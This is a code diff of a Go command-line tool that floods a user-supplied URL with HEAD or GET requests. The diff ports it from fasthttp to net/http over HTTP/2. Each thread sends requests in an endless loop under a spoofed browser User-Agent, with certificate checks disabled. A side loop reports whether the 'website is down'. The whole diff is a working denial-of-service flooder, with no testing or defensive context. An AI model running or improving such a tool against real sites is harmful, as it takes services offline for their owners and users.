@@ -1,26 +1,28 @@
 package main
 
 import (
-	"fmt"
-	"sync"
 	"bufio"
+	"crypto/tls"
+	"fmt"
+	"net/http"
 	"os"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
-	"github.com/valyala/fasthttp"
+	"golang.org/x/net/http2"
 )
 
 func main() {
 	reader := bufio.NewReader(os.Stdin)
 	fmt.Print("Enter HTTP method (HEAD or GET): ")
-	methodBytes, _, _ := reader.ReadLine()
-	method := strings.ToUpper(strings.TrimSpace(string(methodBytes)))
+	method, _ := reader.ReadString('\n')
+	method = strings.ToUpper(strings.TrimSpace(method))
 
 	fmt.Print("Enter URL: ")
-	urlBytes, _, _ := reader.ReadLine()
-	url := string(urlBytes)
+	url, _ := reader.ReadString('\n')
+	url = strings.TrimSpace(url)
 
 	fmt.Print("Enter number of threads: ")
 	threadBytes, _, _ := reader.ReadLine()
@@ -29,47 +31,34 @@ func main() {
 	var wg sync.WaitGroup
 	wg.Add(numThreads)
 
-	client := &fasthttp.Client{
-		MaxIdleConnDuration: 10 * time.Second,
-		ReadTimeout:         10 * time.Second,
-		WriteTimeout:        10 * time.Second,
-		MaxConnsPerHost:     100000,
+	tr := &http2.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
+	client := &http.Client{Transport: tr}
 
 	for i := 0; i < numThreads; i++ {
 		go func() {
 			defer wg.Done()
-			req := fasthttp.AcquireRequest()
-			defer fasthttp.ReleaseRequest(req)
 
-			req.Header.SetMethod(method)
-			req.Header.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")
-			req.SetRequestURI(url)
+			req, _ := http.NewRequest(method, url, nil)
+			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")
 
 			for {
-				client.Do(req, nil)
+				client.Do(req)
 			}
 		}()
 	}
 
 	go func() {
-		reqStatus := fasthttp.AcquireRequest()
-		respStatus := fasthttp.AcquireResponse()
-		defer func() {
-			fasthttp.ReleaseRequest(reqStatus)
-			fasthttp.ReleaseResponse(respStatus)
-		}()
-
-		reqStatus.Header.SetMethod(method)
-        reqStatus.Header.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")
-        reqStatus.SetRequestURI(url)
+		reqStatus, _ := http.NewRequest(method, url, nil)
+        reqStatus.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")
 
         for {
             time.Sleep(10 * time.Second)
             start := time.Now()
-            err := client.Do(reqStatus, respStatus)
+            _, err := client.Do(reqStatus)
             duration := time.Since(start)
-            if err != nil && !strings.Contains(err.Error(), "i/o timeout") && !strings.Contains(err.Error(), "dialing to the given TCP address timed out") && !strings.Contains(err.Error(), "tls handshake timed out") && !strings.Contains(err.Error(), "server closed connection before returning the first response byte") {
+            if err != nil {
                 fmt.Println("Website is down")
             } else {
                 fmt.Printf("Website is up ( %.2f ms)\n", float64(duration.Milliseconds()))
